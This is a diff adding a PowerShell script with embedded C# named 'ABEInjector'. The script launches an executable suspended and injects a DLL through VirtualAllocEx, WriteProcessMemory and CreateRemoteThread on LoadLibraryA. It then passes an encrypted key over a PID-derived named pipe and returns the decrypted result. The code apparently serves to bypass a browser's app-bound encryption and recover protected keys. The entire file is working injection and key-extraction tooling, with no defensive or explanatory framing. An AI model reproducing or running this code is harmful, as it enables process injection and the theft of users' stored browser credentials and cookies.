@@ -1,0 +1,57 @@
+param($exe,$dll,$kh)
+Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.IO.Pipes;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+public static class ABEInjector {
+    [DllImport("kernel32.dll",SetLastError=true)]static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
+    [DllImport("kernel32.dll",SetLastError=true)]static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);
+    [DllImport("kernel32.dll")]static extern IntPtr GetModuleHandleA(string n);
+    [DllImport("kernel32.dll")]static extern IntPtr GetProcAddress(IntPtr h,string n);
+    [DllImport("kernel32.dll",SetLastError=true)]static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint fl,out uint t);
+    [DllImport("kernel32.dll")]static extern bool TerminateProcess(IntPtr h,uint c);
+    [DllImport("kernel32.dll")]static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32.dll")]static extern uint WaitForSingleObject(IntPtr h,uint ms);
+    [DllImport("kernel32.dll",SetLastError=true,CharSet=CharSet.Unicode)]
+    static extern bool CreateProcessW(string lpApp,string lpCmd,IntPtr pa,IntPtr ta,[MarshalAs(UnmanagedType.Bool)]bool inh,uint flags,IntPtr env,string dir,ref STARTUPINFOW si,out PROCESS_INFORMATION pi);
+    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
+    struct STARTUPINFOW{public uint cb;public IntPtr r;public IntPtr d;public IntPtr t;public uint dwX,dwY,dwXSize,dwYSize,dwXCC,dwYCC,dwFA,dwFlags;public ushort wSW,cbR2;public IntPtr lpR2,hSI,hSO,hSE;}
+    [StructLayout(LayoutKind.Sequential)]
+    struct PROCESS_INFORMATION{public IntPtr hProcess,hThread;public uint dwProcessId,dwThreadId;}
+    static uint Rotl32(uint x,int r){return(x<<r)|(x>>(32-r));}
+    static string PidToTag(uint pid){
+        uint a=Rotl32(pid^0xA5A5A5A5u,5),b=Rotl32(pid^0x3C6EF372u,11),c=Rotl32(pid^0x1BF5A7E1u,17),d=Rotl32(pid^0x9E3779B9u,23);
+        return string.Format("{0:X8}{1:X8}{2:X8}{3:X8}",a,b,c,d);}
+    static byte[] HexToBytes(string hex){
+        byte[] bytes=new byte[hex.Length/2];
+        for(int i=0;i<bytes.Length;i++)bytes[i]=Convert.ToByte(hex.Substring(i*2,2),16);
+        return bytes;}
+    public static string Run(string exePath,string dllPath,string encKeyHex){
+        var si=new STARTUPINFOW();si.cb=(uint)Marshal.SizeOf(typeof(STARTUPINFOW));
+        PROCESS_INFORMATION pi;
+        bool ok=CreateProcessW(exePath,null,IntPtr.Zero,IntPtr.Zero,false,4u,IntPtr.Zero,null,ref si,out pi);
+        if(!ok||pi.dwProcessId==0)throw new Exception("CreateProcessW failed: "+Marshal.GetLastWin32Error());
+        string tag=PidToTag(pi.dwProcessId);
+        using(var pipe=new NamedPipeServerStream(tag,PipeDirection.InOut,1,PipeTransmissionMode.Byte,PipeOptions.None)){
+            byte[] db=Encoding.ASCII.GetBytes(dllPath+"\0");
+            IntPtr ra=VirtualAllocEx(pi.hProcess,IntPtr.Zero,(uint)db.Length,0x3000,0x40);
+            uint w=0;WriteProcessMemory(pi.hProcess,ra,db,(uint)db.Length,out w);
+            IntPtr k32=GetModuleHandleA("kernel32.dll");IntPtr ll=GetProcAddress(k32,"LoadLibraryA");
+            uint tid=0;IntPtr hT=CreateRemoteThread(pi.hProcess,IntPtr.Zero,0,ll,ra,0,out tid);
+            if(hT!=IntPtr.Zero){WaitForSingleObject(hT,10000);CloseHandle(hT);}
+            var cts=new CancellationTokenSource(15000);
+            pipe.WaitForConnectionAsync(cts.Token).GetAwaiter().GetResult();
+            byte[] kb=HexToBytes(encKeyHex);byte[] lb=BitConverter.GetBytes((uint)kb.Length);
+            pipe.Write(lb,0,4);pipe.Write(kb,0,kb.Length);pipe.Flush();
+            byte[] buf=new byte[4096];int n=pipe.Read(buf,0,4096);
+            string result=Encoding.ASCII.GetString(buf,0,n).Trim();
+            TerminateProcess(pi.hProcess,0);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
+            return result;
+        }
+    }
+}
+"@
+try{$r=[ABEInjector]::Run($exe,$dll,$kh);Write-Output $r}catch{exit 1}
